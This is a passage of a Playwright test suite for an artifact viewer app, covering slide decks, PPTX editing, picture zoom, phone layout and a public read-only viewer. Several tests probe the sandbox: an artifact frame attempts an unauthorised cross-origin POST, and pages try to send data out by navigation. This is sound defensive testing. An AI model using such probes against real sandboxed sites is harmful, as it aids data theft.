  }, `http://localhost:${APP_PORT}/api/artifacts/${id}/slides`)
  assert.match(outcome, /^blocked/)
  assert.equal(store.requireSummary(id).currentVersion, 1)
  await page.close()
})

test('on a phone the deck editor sits under the slide, both in view, without horizontal scroll', { skip: !chromiumPath && 'no Chromium found' }, async () => {
  const { id } = store.publish({ title: 'Phone edit', files: { 'index.slides.md': { content: Buffer.from(DECK) } } })
  const viewer = await browser.newPage({ viewport: { width: 375, height: 740 } })
  await viewer.goto(`http://localhost:${APP_PORT}/a/${id}`)
  await viewer.frameLocator('#frame').locator('.slide.active').waitFor()
  await viewer.click('#edit')
  await viewer.locator('#editor-source').waitFor()
  const layout = await viewer.evaluate(() => {
    const box = (selector: string) => document.querySelector(selector)!.getBoundingClientRect()
    return { frame: box('#frame'), editor: box('#editor'), overflow: document.documentElement.scrollWidth > innerWidth, height: innerHeight }
  })
  assert.equal(layout.overflow, false)
  assert.ok(layout.frame.height > 150 && layout.editor.top >= layout.frame.bottom - 1, JSON.stringify(layout))
  assert.ok(layout.editor.bottom <= layout.height + 1 && layout.editor.height > 200, JSON.stringify(layout))
  await viewer.close()
})

test('a deck prints one slide per page, and the toolbar offers it as .pptx', { skip: !chromiumPath && 'no Chromium found' }, async () => {
  const { id } = store.publish({ title: 'Print deck', files: { 'index.slides.md': { content: Buffer.from(DECK) } } })
  const viewer = await browser.newPage({ viewport: { width: 1200, height: 800 } })
  await viewer.goto(`http://localhost:${APP_PORT}/a/${id}`)
  const frame = viewer.frameLocator('#frame')
  await frame.locator('.slide.active').waitFor()
  const page = viewer.frames().find((f) => f.url().includes(`:${CONTENT_PORT}/`))!
  // The PDF button prints from inside the sandbox (allowed by allow-modals).
  await page.evaluate(() => { (window as unknown as { print: () => void }).print = () => document.body.setAttribute('data-printed', '1') })
  await frame.locator('[data-deck="print"]').click()
  await frame.locator('body[data-printed="1"]').waitFor()
  await viewer.emulateMedia({ media: 'print' })
  const printed = await page.evaluate(() =>
    [...document.querySelectorAll('.slide')].map((slide) => {
      const style = getComputedStyle(slide)
      return { visible: style.visibility === 'visible', breaks: style.breakAfter === 'page' }
    })
  )
  assert.deepEqual(printed, [1, 2, 3].map(() => ({ visible: true, breaks: true })))
  assert.equal(await page.evaluate(() => getComputedStyle(document.querySelector('.deck-bar')!).display), 'none')
  await viewer.emulateMedia({ media: 'screen' })

  const link = viewer.locator('#export-pptx')
  assert.equal(await link.isVisible(), true)
  const [download] = await Promise.all([viewer.waitForEvent('download'), link.click()])
  assert.equal(download.suggestedFilename(), 'Print deck.pptx')
  await viewer.close()
})

test('the editor counts slides like the server, and text typed while a save is on its way stays unsaved', { skip: !chromiumPath && 'no Chromium found' }, async () => {
  const { id } = store.publish({ title: 'Editor edges', files: { 'index.slides.md': { content: Buffer.from('# A\n---\n???\n---\n## C\nlast') } } })
  const viewer = await browser.newPage({ viewport: { width: 1300, height: 800 } })
  await viewer.goto(`http://localhost:${APP_PORT}/a/${id}`)
  const frame = viewer.frameLocator('#frame')
  await frame.locator('.slide.active').waitFor()
  assert.equal(await frame.locator('#deck-counter').textContent(), '1 / 2')
  await viewer.click('#edit')
  const source = viewer.locator('#editor-source')
  await viewer.waitForFunction(() => (document.getElementById('editor-source') as HTMLTextAreaElement).value.includes('last'))
  // The cursor in "## C" (the server's slide 2, after a notes-only chunk it drops) shows slide 2.
  await source.evaluate((el: HTMLTextAreaElement) => { el.focus(); el.setSelectionRange(el.value.length, el.value.length) })
  await viewer.keyboard.press('End')
  await frame.locator('.slide.active#slide-2').waitFor({ timeout: 3000 })

  // Hold the save on the wire, type meanwhile: the new text is not counted as saved.
  let release!: () => void
  const held = new Promise<void>((resolve) => { release = resolve })
  await viewer.route('**/slides', async (route) => {
    await held
    await route.continue()
  })
  await viewer.keyboard.type(' one')
  await viewer.keyboard.press('ControlOrMeta+s')
  await viewer.locator('#editor-status', { hasText: '儲存中' }).waitFor()
  await viewer.keyboard.type(' two')
  await viewer.keyboard.press('ControlOrMeta+s')
  release()
  await viewer.locator('#editor-status', { hasText: '未儲存' }).waitFor({ timeout: 5000 })
  assert.equal(store.requireSummary(id).currentVersion, 2)
  assert.match(store.blobs.read(store.requireVersion(id, 2).files['index.slides.md'].sha256).toString(), /last one$/)
  assert.equal(await viewer.locator('#save-deck').isEnabled(), true)
  await viewer.unroute('**/slides')
  await viewer.click('#save-deck')
  await viewer.locator('#editor-status', { hasText: '已存成 v3' }).waitFor({ timeout: 5000 })
  await viewer.close()
})

test('the editor never pairs old text with a newer base: typing during a reload, a failed reload, a slow open', { skip: !chromiumPath && 'no Chromium found' }, async () => {
  const source = (id: string, v: number) => store.blobs.read(store.requireVersion(id, v).files['index.slides.md'].sha256).toString()
  const scenario = async (name: string, run: (ctx: { viewer: import('playwright-core').Page; id: string }) => Promise<void>) => {
    const { id } = store.publish({ title: name, files: { 'index.slides.md': { content: Buffer.from('# v1 original\n') } } })
    const viewer = await browser.newPage({ viewport: { width: 1300, height: 800 } })
    await viewer.goto(`http://localhost:${APP_PORT}/a/${id}`)
    await viewer.frameLocator('#frame').locator('.slide.active').waitFor()
    await run({ viewer, id })
    // Whatever happened, saving must not silently replace v2.
    viewer.once('dialog', (dialog) => dialog.dismiss())
    await viewer.locator('#editor-source').press('End')
    await viewer.keyboard.type(' edit')
    await viewer.click('#save-deck')
    await viewer.waitForTimeout(800)
    const now = store.requireSummary(id).currentVersion
    assert.ok(now === 2 || source(id, now).startsWith('# v2'), `${name}: v${now} = ${JSON.stringify(source(id, now))}`)
    await viewer.close()
  }
  const hold = async (viewer: import('playwright-core').Page, version: number, answer: 'continue' | 'fail') => {
    let release!: () => void
    const held = new Promise<void>((resolve) => { release = resolve })
    let seen!: () => void
    const requested = new Promise<void>((resolve) => { seen = resolve })
    await viewer.route((url) => url.pathname.endsWith('/files/index.slides.md') && url.searchParams.get('v') === String(version), async (route) => {
      seen()
      await held
      if (answer === 'fail') await route.fulfill({ status: 503, body: 'down' })
      else await route.continue()
    })
    return { requested, release }
  }

  await scenario('typing during reload', async ({ viewer, id }) => {
    await viewer.click('#edit')
    await viewer.waitForFunction(() => (document.getElementById('editor-source') as HTMLTextAreaElement).value.includes('v1'))
    const gate = await hold(viewer, 2, 'continue')
    store.update(id, { files: { 'index.slides.md': { content: Buffer.from('# v2 by publisher\n') } } })
    await gate.requested
    await viewer.locator('#editor-source').press('End')
    await viewer.keyboard.type(' TYPED')
    gate.release()
    await viewer.waitForTimeout(500)
    assert.match(await viewer.locator('#editor-source').inputValue(), /TYPED/)
  })

  await scenario('failed reload', async ({ viewer, id }) => {
    await viewer.click('#edit')
    await viewer.waitForFunction(() => (document.getElementById('editor-source') as HTMLTextAreaElement).value.includes('v1'))
    const gate = await hold(viewer, 2, 'fail')
    store.update(id, { files: { 'index.slides.md': { content: Buffer.from('# v2 by publisher\n') } } })
    await gate.requested
    gate.release()
    await viewer.waitForTimeout(500)
  })

  await scenario('slow open', async ({ viewer, id }) => {
    const gate = await hold(viewer, 1, 'continue')
    await viewer.click('#edit')
    await gate.requested
    store.update(id, { files: { 'index.slides.md': { content: Buffer.from('# v2 by publisher\n') } } })
    await viewer.waitForFunction(() => document.querySelector<HTMLSelectElement>('#version')!.options.length === 2)
    gate.release()
    await viewer.waitForTimeout(500)
  })
})

test('a PowerPoint file shows as a deck at its own size: pictures load inside the sandbox, notes, no edit button', { skip: !chromiumPath && 'no Chromium found' }, async () => {
  const pptx = new PptxGenJS()
  pptx.layout = 'LAYOUT_4x3'
  let slide = pptx.addSlide()
  slide.background = { color: '0B3D2E' }
  slide.addText('第一頁', { x: 1, y: 1, w: 6, h: 1, color: 'FFFFFF', fontSize: 32 })
  slide.addNotes('講稿一')
  slide = pptx.addSlide()
  slide.addImage({ data: 'image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8BQDwAEhQGAhKmMIQAAAABJRU5ErkJggg==', x: 1, y: 1, w: 2, h: 2 })
  const bytes = (await pptx.write({ outputType: 'nodebuffer' })) as Buffer
  const { id } = store.publish({ title: 'PowerPoint', files: { '季報 (v2).pptx': { content: bytes } } })
  const viewer = await browser.newPage()
  await viewer.setViewportSize({ width: 1200, height: 800 })
  await viewer.goto(`http://localhost:${APP_PORT}/a/${id}`)
  const frame = viewer.frameLocator('#frame')
  await frame.locator('.slide.active#slide-1', { hasText: '第一頁' }).waitFor()
  assert.equal(await frame.locator('#deck-counter').textContent(), '1 / 2')
  const box = await frame.locator('.slide.active').boundingBox()
  assert.ok(box && Math.abs(box.width / box.height - 4 / 3) < 0.01, JSON.stringify(box))
  await frame.locator('[data-deck="notes"]').click()
  assert.equal(await frame.locator('#deck-notes').textContent(), '講稿一')
  await viewer.keyboard.press('ArrowRight')
  await frame.locator('.slide.active#slide-2').waitFor()
  // The picture comes from inside the file, through the version's own path the CSP allows.
  await frame.locator('.slide.active img').evaluate((img: HTMLImageElement) => (img.complete ? null : new Promise((done) => img.addEventListener('load', done, { once: true }))))
  assert.ok((await frame.locator('.slide.active img').evaluate((img: HTMLImageElement) => img.naturalWidth)) > 0)
  // A click on the picture opens it large, and the deck stays on this slide meanwhile.
  await frame.locator('.slide.active .pp-pic img').click()
  await frame.locator('dialog.artifact-lightbox[open] img').waitFor({ timeout: 5000 })
  await viewer.keyboard.press('ArrowLeft')
  assert.equal(await frame.locator('#deck-counter').textContent(), '2 / 2')
  await viewer.keyboard.press('Escape')
  await frame.locator('dialog.artifact-lightbox').waitFor({ state: 'detached', timeout: 5000 })
  assert.equal(await viewer.locator('#edit').isHidden(), true)
  assert.equal(await viewer.locator('#export-pptx').isVisible(), true)
  assert.deepEqual(store.listErrors(id, 1), [])
  await viewer.close()
})

test('PPTX editing has a separate trusted page while artifact frames cannot create edit sessions', { skip: !chromiumPath && 'no Chromium found' }, async () => {
  const config = { dataDir: dir, appPort: 0, contentPort: CONTENT_PORT, appOrigin: '', contentOrigin: `http://127.0.0.1:${CONTENT_PORT}`, tokens: [TOKEN],
    office: { url: `http://127.0.0.1:${SINK_PORT}`, internalUrl: `http://127.0.0.1:${SINK_PORT}`, callbackOrigin: 'http://internal.test', secret: 'office-e2e-test-secret-0123456789' } }
  const app = createAppServer(store, config)
  const server = serve({ fetch: app.fetch, port: 0, hostname: '127.0.0.1' })
  servers.push(server)
  await new Promise<void>((resolve) => server.listening ? resolve() : server.once('listening', resolve))
  config.appOrigin = `http://127.0.0.1:${(server.address() as { port: number }).port}`
  const content = serve({ fetch: createContentServer(store, config).fetch, port: 0, hostname: '127.0.0.1' })
  servers.push(content)
  await new Promise<void>((resolve) => content.listening ? resolve() : content.once('listening', resolve))
  config.contentOrigin = `http://127.0.0.1:${(content.address() as { port: number }).port}`
  const pptx = new PptxGenJS()
  pptx.addSlide().addText('可以編輯', { x: 1, y: 1, w: 5, h: 1 })
  const { id } = store.publish({ title: '編輯測試', files: { 'deck.pptx': { content: await pptx.write({ outputType: 'nodebuffer' }) as Buffer } } })
  const viewer = await browser.newPage()
  await viewer.goto(`${config.appOrigin}/a/${id}`)
  await viewer.locator('#edit').waitFor({ state: 'visible', timeout: 2000 })
  const csp = (await viewer.request.get(`${config.appOrigin}/a/${id}`)).headers()['content-security-policy']
  assert.equal(csp, `frame-src ${config.contentOrigin}/a/${id}/`)
  await viewer.frameLocator('#frame').locator('.slide.active').waitFor()
  const artifactFrame = viewer.frames().find((frame) => frame.url().startsWith(`${config.contentOrigin}/a/`))!
  assert.equal(await artifactFrame.evaluate(async (url) => {
    try { await fetch(url, { method: 'POST', headers: { 'x-artifact-client': 'viewer', 'content-type': 'application/json' }, body: '{"baseVersion":1}' }); return 'allowed' } catch { return 'blocked' }
  }, `${config.appOrigin}/api/artifacts/${id}/office-edits`), 'blocked')
  await viewer.locator('#edit').click()
  await viewer.waitForURL(/\/edit\//)
  assert.equal(await viewer.locator('#frame').count(), 0)
  assert.equal(await viewer.locator('#office-close').isDisabled(), true)
  const editorCsp = (await viewer.request.get(viewer.url())).headers()['content-security-policy']
  assert.ok(editorCsp.includes(`frame-src ${config.office.url}`))
  assert.ok(!editorCsp.includes("'unsafe-eval'"))
  await viewer.close()
})

const WIDE_PICTURE = Buffer.from('<svg xmlns="http://www.w3.org/2000/svg" width="2400" height="1200"><rect width="2400" height="1200" fill="#4a7"/></svg>')

test('clicking a picture opens it large in a dialog; pictures in links keep their clicks', { skip: !chromiumPath && 'no Chromium found' }, async () => {
  const md = '# 圖\n\n![大圖](pic.svg)\n\n[![連結圖](pic.svg)](other.md)\n'
  const { id } = store.publish({ title: 'Pictures', files: { 'index.md': { content: Buffer.from(md) }, 'other.md': { content: Buffer.from('# 另一頁\n') }, 'pic.svg': { content: WIDE_PICTURE } } })
  const viewer = await browser.newPage()
  await viewer.setViewportSize({ width: 1200, height: 800 })
  await viewer.goto(`http://localhost:${APP_PORT}/a/${id}`)
  const frame = viewer.frameLocator('#frame')
  await frame.locator('img[alt="大圖"]').click()
  const dialog = frame.locator('dialog.artifact-lightbox[open]')
  await dialog.waitFor({ timeout: 5000 })
  assert.match((await dialog.locator('img').getAttribute('src'))!, /pic\.svg$/)
  // Fitted to the frame at first, then a click shows it at full size.
  const fitted = await dialog.locator('img').boundingBox()
  assert.ok(fitted!.width <= 1200 && fitted!.height <= 800, JSON.stringify(fitted))
  await dialog.locator('img').click()
  await frame.locator('dialog.artifact-lightbox.zoomed[open]').waitFor()
  assert.equal(Math.round((await dialog.locator('img').boundingBox())!.width), 2400)
  await viewer.keyboard.press('Escape')
  await frame.locator('dialog.artifact-lightbox').waitFor({ state: 'detached', timeout: 5000 })
  // Reopen; two fingers spreading apart zoom in, a trackpad pinch (ctrl + wheel) zooms back out.
  await frame.locator('img[alt="大圖"]').click()
  await dialog.waitFor()
  const before = (await dialog.locator('img').boundingBox())!.width
  await dialog.evaluate((d) => {
    const fire = (type: string, id: number, x: number) => d.dispatchEvent(new PointerEvent(type, { pointerId: id, pointerType: 'touch', clientX: x, clientY: 300, bubbles: true }))
    fire('pointerdown', 1, 500); fire('pointerdown', 2, 600)
    fire('pointermove', 1, 400); fire('pointermove', 2, 700)
    fire('pointerup', 1, 400); fire('pointerup', 2, 700)
  })
  const pinched = (await dialog.locator('img').boundingBox())!.width
  assert.ok(pinched > before * 2.5, `${before} -> ${pinched}`)
  await viewer.mouse.move(600, 400)
  await viewer.keyboard.down('Control')
  await viewer.mouse.wheel(0, 400)
  await viewer.keyboard.up('Control')
  await viewer.waitForTimeout(100)
  assert.ok((await dialog.locator('img').boundingBox())!.width < pinched, 'ctrl+wheel zooms out')
  await viewer.keyboard.press('Escape')
  await frame.locator('dialog.artifact-lightbox').waitFor({ state: 'detached', timeout: 5000 })
  // Reopen, then close by clicking outside the picture.
  await frame.locator('img[alt="大圖"]').click()
  await dialog.waitFor()
  // The fitted picture is centred, so the strip just under the viewer bar is backdrop.
  await viewer.mouse.click(600, 60)
  await frame.locator('dialog.artifact-lightbox').waitFor({ state: 'detached', timeout: 5000 })

  // A picture inside a link still follows the link.
  await frame.locator('img[alt="連結圖"]').click()
  await frame.locator('h1', { hasText: '另一頁' }).waitFor({ timeout: 5000 })
  assert.equal(await frame.locator('dialog.artifact-lightbox[open]').count(), 0)
  await viewer.close()

  await viewer.close()
})

test('hand-written pages zoom their pictures too, except icons, opted-out pictures and pictures that do something', { skip: !chromiumPath && 'no Chromium found' }, async () => {
  const html = `<!doctype html><body style="margin:0">
<img id="shot" src="pic.svg" width="300">
<img id="icon" src="pic.svg" width="24" height="24">
<img id="opt" src="pic.svg" width="300" data-no-zoom>
<div onclick="document.title='clicked'"><img id="handled" src="pic.svg" width="300"></div>
<span role="button"><img id="rolebtn" src="pic.svg" width="300"></span>
<img id="pointer" src="pic.svg" width="300" style="cursor:pointer">
<style>figure.own img { cursor: zoom-in }</style><figure class="own"><img id="ownzoom" src="pic.svg" width="300"></figure>
</body>`
  const { id } = store.publish({ title: 'Own', files: { 'index.html': { content: Buffer.from(html) }, 'pic.svg': { content: WIDE_PICTURE } } })
  const viewer = await browser.newPage()
  await viewer.setViewportSize({ width: 1200, height: 800 })
  await viewer.goto(`http://localhost:${APP_PORT}/a/${id}`)
  const frame = viewer.frameLocator('#frame')
  for (const skipped of ['#icon', '#opt', '#handled', '#rolebtn', '#pointer', '#ownzoom']) {
    await frame.locator(skipped).click()
    await viewer.waitForTimeout(150)
    assert.equal(await frame.locator('dialog.artifact-lightbox').count(), 0, skipped)
  }
  await frame.locator('#shot').click()
  await frame.locator('dialog.artifact-lightbox[open] img').waitFor({ timeout: 5000 })
  await viewer.keyboard.press('Escape')
  await frame.locator('dialog.artifact-lightbox').waitFor({ state: 'detached', timeout: 5000 })
  await viewer.close()
})

test('mermaid diagrams and wide tables open large too', { skip: !chromiumPath && 'no Chromium found' }, async () => {
  const columns = Array.from({ length: 14 }, (_, i) => `欄位${i}`)
  const table = `| ${columns.join(' | ')} |\n|${columns.map(() => '---').join('|')}|\n| ${columns.map((_, i) => `value-${i}-0123456789`).join(' | ')} |\n`
  const md = `# 圖表\n\n\`\`\`mermaid\nflowchart LR\n  A[寫檔] --> B[發布]\n\`\`\`\n\n${table}\n| 短 | 表 |\n|---|---|\n| a | b |\n`
  const { id } = store.publish({ title: 'Diagram zoom', files: { 'index.md': { content: Buffer.from(md) } } })
  const viewer = await browser.newPage()
  await viewer.setViewportSize({ width: 800, height: 700 })
  await viewer.goto(`http://localhost:${APP_PORT}/a/${id}`)
  const frame = viewer.frameLocator('#frame')
  await frame.locator('figure.diagram svg').click()
  const dialog = frame.locator('dialog.artifact-lightbox[open]')
  await dialog.locator('svg', { hasText: '寫檔' }).waitFor({ timeout: 5000 })
  // Still themed: the node fill resolves through the page's colour variables.
  assert.notEqual(await dialog.locator('svg rect').first().evaluate((r) => getComputedStyle(r).fill), 'rgb(0, 0, 0)')
  await viewer.keyboard.press('Escape')
  await frame.locator('dialog.artifact-lightbox').waitFor({ state: 'detached', timeout: 5000 })
  // Only a table wider than the page gets the button.
  assert.equal(await frame.locator('.table-zoom:visible').count(), 1)
  await frame.locator('.table-zoom:visible').click()
  await dialog.locator('table th', { hasText: '欄位13' }).waitFor({ timeout: 5000 })
  await viewer.keyboard.press('Escape')
  await frame.locator('dialog.artifact-lightbox').waitFor({ state: 'detached', timeout: 5000 })
  await viewer.close()
})

test('a picture opened large on a slide holds the deck still until it closes', { skip: !chromiumPath && 'no Chromium found' }, async () => {
  const deck = ['# Pic', '![大圖](pic.svg)', '---', '## Two', 'text'].join('\n')
  const { id } = store.publish({ title: 'Deck pictures', files: { 'index.slides.md': { content: Buffer.from(deck) }, 'pic.svg': { content: WIDE_PICTURE } } })
  const viewer = await browser.newPage()
  await viewer.setViewportSize({ width: 1200, height: 800 })
  await viewer.goto(`http://localhost:${APP_PORT}/a/${id}`)
  const frame = viewer.frameLocator('#frame')
  // A picture still loading is not zoomed, so wait for it as a reader's eye would.
  await frame.locator('.slide.active#slide-1 img').evaluate((img: HTMLImageElement) => (img.complete && img.naturalWidth ? null : new Promise((done) => img.addEventListener('load', done, { once: true }))))
  await frame.locator('.slide.active#slide-1 img').click()
  await frame.locator('dialog.artifact-lightbox[open]').waitFor({ timeout: 5000 })
  for (const key of ['ArrowRight', ' ', 'Enter']) await viewer.keyboard.press(key)
  assert.equal(await frame.locator('#deck-counter').textContent(), '1 / 2')
  await viewer.keyboard.press('Escape')
  await frame.locator('dialog.artifact-lightbox').waitFor({ state: 'detached', timeout: 5000 })
  await viewer.keyboard.press('ArrowRight')
  await frame.locator('.slide.active#slide-2').waitFor()
  await viewer.close()
})

test('on a phone the viewer bar slides away while reading down and comes back on scrolling up', { skip: !chromiumPath && 'no Chromium found' }, async () => {
  const md = `# 長文\n\n| 項目 | 內容 |\n|---|---|\n| 受測版本 | ${'很長的說明文字'.repeat(8)} |\n\n${'段落文字。\n\n'.repeat(150)}`
  const { id } = store.publish({ title: '手機閱讀', files: { 'index.md': { content: Buffer.from(md) } } })
  const viewer = await browser.newPage()
  await viewer.setViewportSize({ width: 390, height: 760 })
  await viewer.goto(`http://localhost:${APP_PORT}/a/${id}`)
  const pageFrame = async () => { await viewer.frameLocator('#frame').locator('h1').waitFor(); return viewer.frames().find((f) => f.url().includes(`:${CONTENT_PORT}/`))! }
  const frame = await pageFrame()
  // A short label column keeps its words on one line instead of one character per line.
  const lines = await frame.locator('td', { hasText: '受測版本' }).evaluate((td) => {
    const range = document.createRange()
    range.selectNodeContents(td)
    return new Set([...range.getClientRects()].map((rect) => Math.round(rect.top))).size
  })
  assert.equal(lines, 1, 'label cell lines')
  const barTop = () => viewer.locator('.viewer-bar').evaluate((bar) => bar.getBoundingClientRect().bottom)
  assert.ok((await barTop()) > 40)
  await frame.evaluate(() => scrollTo(0, 1500))
  await viewer.waitForFunction(() => document.querySelector('.viewer-bar')!.getBoundingClientRect().bottom <= 1, null, { timeout: 3000 })
  // The frame takes the room the bar gave up.
  assert.ok((await viewer.locator('#frame').boundingBox())!.height > 740)
  await frame.evaluate(() => scrollTo(0, 1200))
  await viewer.waitForFunction(() => document.querySelector('.viewer-bar')!.getBoundingClientRect().bottom > 40, null, { timeout: 3000 })
  // Wide screens keep the bar where it is.
  await viewer.setViewportSize({ width: 1200, height: 800 })
  await frame.evaluate(() => scrollTo(0, 3000))
  await viewer.waitForTimeout(600)
  assert.ok((await barTop()) > 40)
  await viewer.close()
})

test('a report page prints from the viewer bar, and a Markdown page offers its source file', { skip: !chromiumPath && 'no Chromium found' }, async () => {
  const { id } = store.publish({ title: '列印', files: { 'index.md': { content: Buffer.from('# 報告\n\n內容\n') } } })
  const viewer = await browser.newPage()
  await viewer.setViewportSize({ width: 1200, height: 800 })
  await viewer.goto(`http://localhost:${APP_PORT}/a/${id}`)
  await viewer.frameLocator('#frame').locator('h1').waitFor()
  const pageFrame = viewer.frames().find((f) => f.url().includes(`:${CONTENT_PORT}/`))!
  await pageFrame.evaluate(() => { window.print = () => { document.body.dataset.printed = 'yes' } })
  await viewer.locator('#print').click()
  await pageFrame.waitForFunction(() => document.body.dataset.printed === 'yes', null, { timeout: 3000 })
  const source = viewer.locator('#export-pptx')
  assert.equal(await source.textContent(), 'MD')
  assert.match((await source.getAttribute('href'))!, new RegExp(`/api/artifacts/${id}/files/index\\.md\\?v=1$`))
  await viewer.close()

  // A deck prints from its own bar, so the viewer's print button stays out of the way.
  const deck = store.publish({ title: 'Deck print', files: { 'index.slides.md': { content: Buffer.from('# A\n---\n## B') } } })
  const second = await browser.newPage()
  await second.setViewportSize({ width: 1200, height: 800 })
  await second.goto(`http://localhost:${APP_PORT}/a/${deck.id}`)
  await second.frameLocator('#frame').locator('.slide.active').waitFor()
  assert.equal(await second.locator('#print').isHidden(), true)
  await second.close()
})

test('on a phone the first tap on a full-width picture already shows it larger', { skip: !chromiumPath && 'no Chromium found' }, async () => {
  const { id } = store.publish({ title: '手機點圖', files: { 'index.md': { content: Buffer.from('# 圖\n\n![寬圖](pic.svg)\n') }, 'pic.svg': { content: WIDE_PICTURE } } })
  const viewer = await browser.newPage()
  await viewer.setViewportSize({ width: 390, height: 760 })
  await viewer.goto(`http://localhost:${APP_PORT}/a/${id}`)
  const frame = viewer.frameLocator('#frame')
  const inline = (await frame.locator('img[alt="寬圖"]').boundingBox())!.width
  await frame.locator('img[alt="寬圖"]').click()
  const shown = frame.locator('dialog.artifact-lightbox[open] img')
  await shown.waitFor({ timeout: 5000 })
  const width = (await shown.boundingBox())!.width
  assert.ok(width > inline * 1.5, `inline ${inline}, dialog ${width}`)
  // A tap brings it back to the fitted size.
  await shown.click({ position: { x: 20, y: 20 } })
  await frame.locator('dialog.artifact-lightbox:not(.zoomed)[open]').waitFor({ timeout: 3000 })
  await viewer.close()
})

test('on a phone the bar stays away at the bottom of a page instead of bouncing', { skip: !chromiumPath && 'no Chromium found' }, async () => {
  const md = `# 長文\n\n${'段落文字。\n\n'.repeat(120)}<div style="min-height:100vh">結尾</div>\n`
  const { id } = store.publish({ title: '頁尾', files: { 'index.md': { content: Buffer.from(md) } } })
  const viewer = await browser.newPage()
  await viewer.setViewportSize({ width: 390, height: 760 })
  await viewer.goto(`http://localhost:${APP_PORT}/a/${id}`)
  await viewer.frameLocator('#frame').locator('h1').waitFor()
  const frame = viewer.frames().find((f) => f.url().includes(`:${CONTENT_PORT}/`))!
  for (let y = 400; y <= 20000; y += 600) await frame.evaluate((top) => scrollTo(0, top), y)
  await frame.evaluate(() => scrollTo(0, document.documentElement.scrollHeight))
  await viewer.waitForTimeout(1500)
  const state = async () => ({
    bar: await viewer.locator('.viewer-bar').evaluate((bar) => Math.round(bar.getBoundingClientRect().bottom)),
    gap: await frame.evaluate(() => Math.round(document.documentElement.scrollHeight - innerHeight - scrollY))
  })
  const first = await state()
  await viewer.waitForTimeout(1000)
  const second = await state()
  assert.ok(first.bar <= 1 && second.bar <= 1, `bar ${first.bar} -> ${second.bar}`)
  assert.ok(second.gap <= 2, `not at the bottom: ${second.gap}`)

  // A page barely taller than the frame, read to the end in one move: the bar giving its room back
  // pulls the page up by that much, which must not read as scrolling up.
  const short = store.publish({ title: '短頁', files: { 'index.html': { content: Buffer.from('<!doctype html><body style="margin:0"><div style="height:calc(100vh + 160px);background:linear-gradient(#eee,#999)"></div></body>') } } })
  await viewer.goto(`http://localhost:${APP_PORT}/a/${short.id}`)
  await viewer.frameLocator('#frame').locator('div').waitFor()
  const shortFrame = viewer.frames().find((f) => f.url().includes(`/a/${short.id}/`))!
  await shortFrame.evaluate(() => scrollTo(0, document.documentElement.scrollHeight))
  await viewer.waitForTimeout(1500)
  const bars: number[] = []
  for (let i = 0; i < 5; i++) {
    bars.push(await viewer.locator('.viewer-bar').evaluate((bar) => Math.round(bar.getBoundingClientRect().bottom)))
    await viewer.waitForTimeout(250)
  }
  assert.equal(new Set(bars).size, 1, `bar moved: ${bars.join(',')}`)
  await viewer.close()
})

test('the public viewer shows a public page in the sandbox, read-only, and nothing of a private one', { skip: !chromiumPath && 'no Chromium found' }, async () => {
  const md = '# 公開報告\n\n![圖](pic.svg)\n\n[下一頁](two.md)\n'
  const { id } = store.publish({ title: '公開報告', files: { 'index.md': { content: Buffer.from(md) }, 'two.md': { content: Buffer.from('# 第二頁\n') }, 'pic.svg': { content: WIDE_PICTURE } } })
  const viewer = await browser.newPage()
  await viewer.setViewportSize({ width: 390, height: 760 })
  // Private by default: the public viewer does not know it.
  const closed = await viewer.goto(`http://localhost:${PUBLIC_APP_PORT}/a/${id}`)
  assert.equal(closed!.status(), 404)

  store.setVisibility(id, 'public')
  const errors: string[] = []
  viewer.on('console', (message) => { if (message.type() === 'error') errors.push(message.text()) })
  await viewer.goto(`http://localhost:${PUBLIC_APP_PORT}/a/${id}`)
  const frame = viewer.frameLocator('iframe.public-frame')
  await frame.locator('h1', { hasText: '公開報告' }).waitFor({ timeout: 5000 })
  // The page runs in the same sandbox: opaque origin, and the bridge talks to the public viewer.
  const pageFrame = viewer.frames().find((f) => f.url().startsWith(`http://127.0.0.1:${PUBLIC_CONTENT_PORT}/`))!
  assert.equal(await pageFrame.evaluate(() => origin), 'null')
  // Pictures open large here too.
  await frame.locator('img[alt="圖"]').click()
  await frame.locator('dialog.artifact-lightbox[open] img').waitFor({ timeout: 5000 })
  await viewer.keyboard.press('Escape')
  // Links between its own pages work inside the frame.
  await frame.locator('a', { hasText: '下一頁' }).click()
  await frame.locator('h1', { hasText: '第二頁' }).waitFor({ timeout: 5000 })
  // Nothing on the page writes: no comment box, no pin, no delete.
  assert.equal(await viewer.locator('#comments, #pin, #menu-delete, #toggle-comments').count(), 0)
  assert.deepEqual(errors.filter((text) => !/favicon/.test(text)), [])

  // Made private again while open: a reload shows nothing.
  store.setVisibility(id, 'private')
  const gone = await viewer.goto(`http://localhost:${PUBLIC_APP_PORT}/a/${id}`)
  assert.equal(gone!.status(), 404)
  const file = await viewer.request.get(`http://127.0.0.1:${PUBLIC_CONTENT_PORT}/a/${id}/v/1/pic.svg`)
  assert.equal(file.status(), 404)
  await viewer.close()
})

for (const [name, body] of Object.entries(EXFIL_PAGES)) {
  test(`a public page cannot send data out by navigation either (${name})`, { skip: !chromiumPath && 'no Chromium found' }, async () => {
    const sink = await listenSink()
    try {
      const { id } = store.publish({ title: 'Exfil public', files: { 'index.html': { content: Buffer.from(`<!doctype html><html><head></head><body>${body}</body></html>`) } } })
      store.setVisibility(id, 'public')
      const context = await browser.newContext()
      const page = await context.newPage()
      await page.goto(`http://localhost:${PUBLIC_APP_PORT}/a/${id}`)
      await page.waitForTimeout(1500)
      assert.deepEqual(sink.hits, [])
      assert.equal(context.pages().length, 1)
      assert.ok(page.frames().every((frame) => !frame.url().includes(`:${SINK_PORT}`)))
      await context.close()
    } finally {
      sink.server.close()
    }
  })
}

test('the tailnet gallery and viewer show which artifacts are public, with the public link', { skip: !chromiumPath && 'no Chromium found' }, async () => {
  const shared = store.publish({ title: '已公開的報告', files: { 'index.md': { content: Buffer.from('# x\n') } } })
  store.setVisibility(shared.id, 'public')
  const hidden = store.publish({ title: '私人報告', files: { 'index.md': { content: Buffer.from('# y\n') } } })
  const viewer = await browser.newPage()
  await viewer.setViewportSize({ width: 1200, height: 800 })
  await viewer.goto(`http://localhost:${APP_PORT}/`)
  const card = viewer.locator('.card', { hasText: '已公開的報告' })
  await card.locator('.public-mark').waitFor({ timeout: 5000 })
  assert.equal(await viewer.locator('.card', { hasText: '私人報告' }).locator('.public-mark').count(), 0)

  await viewer.goto(`http://localhost:${APP_PORT}/a/${shared.id}`)
  const link = viewer.locator('#public-link')
  await link.waitFor({ state: 'visible', timeout: 5000 })
